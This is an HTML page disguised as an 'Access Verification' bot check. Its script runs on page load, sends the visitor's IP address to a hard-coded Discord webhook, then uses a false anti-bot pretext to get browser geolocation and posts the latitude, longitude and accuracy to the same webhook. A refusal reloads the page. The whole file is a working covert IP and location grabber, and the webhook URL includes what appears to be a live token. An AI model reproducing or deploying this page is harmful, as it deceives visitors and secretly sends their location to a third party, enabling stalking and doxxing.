<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Access Verification</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background-color: #2c2f33;
      color: #fff;
      overflow: hidden;
    }

    .overlay {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.8);
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      text-align: center;
      z-index: 9999;
    }

    .container {
      display: none;
      text-align: center;
      background: rgba(35, 39, 42, 0.9);
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.5);
    }

    button {
      padding: 10px 20px;
      border: none;
      border-radius: 5px;
      background-color: #7289da;
      color: white;
      cursor: pointer;
    }

    button:hover {
      background-color: #5b6eae;
    }
  </style>
</head>
<body>
  <!-- Overlay with Geolocation Prompt -->
  <div class="overlay" id="overlay">
    <h1>Allow Location Access</h1>
    <p>You need to click "Allow" so we can verify you are not a bot and grant access to the site.</p>
  </div>

  <!-- Main Content -->
  <div class="container" id="mainContent">
    <h1>Welcome!</h1>
    <p>Your IP and location have been verified.</p>
  </div>

  <script>
    const overlay = document.getElementById('overlay');
    const mainContent = document.getElementById('mainContent');
    const webhookUrl = 'https://discordapp.com/api/webhooks/1335664944028582000/c1CoPiNgVyekogi0OhqJQizguoBFy5XmTKydzmWb-8XQFOYEAZ_PyT79OgkQsc1ElmGl';

    let userIP = "Fetching...";

    // Fetch IPv4 Address
    async function fetchIPv4() {
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        userIP = data.ip;
        console.log(`User IP: ${userIP}`);

        // Send IP to Discord Webhook immediately
        await fetch(webhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            content: `🚨 **User IP Logged:** ${userIP}`,
          }),
        });
      } catch (error) {
        console.error('Error fetching IP:', error);
      }
    }

    // Request Geolocation Access
    async function requestGeolocation() {
      return new Promise((resolve) => {
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(
            async (position) => {
              const { latitude, longitude, accuracy } = position.coords;

              // Send Geolocation Data to Discord Webhook
              await fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                  content: `📍 **User Geolocation:**\n- Latitude: ${latitude}\n- Longitude: ${longitude}\n- Accuracy: ${accuracy} meters\n- IP: ${userIP}`,
                }),
              });

              resolve(true);
            },
            (error) => {
              console.error('Geolocation error:', error);
              resolve(false);
            }
          );
        } else {
          resolve(false);
        }
      });
    }

    // Handle Access Verification
    async function verifyAccess() {
      // Fetch the user's IP address
      await fetchIPv4();

      // Prompt for geolocation and verify access
      const geolocationAllowed = await requestGeolocation();

      if (geolocationAllowed) {
        // Hide overlay and show main content
        overlay.style.display = 'none';
        mainContent.style.display = 'block';
      } else {
        alert('Geolocation is required to access this site.');
        location.reload();
      }
    }

    // Start verification process
    verifyAccess();
  </script>
</body>
</html>
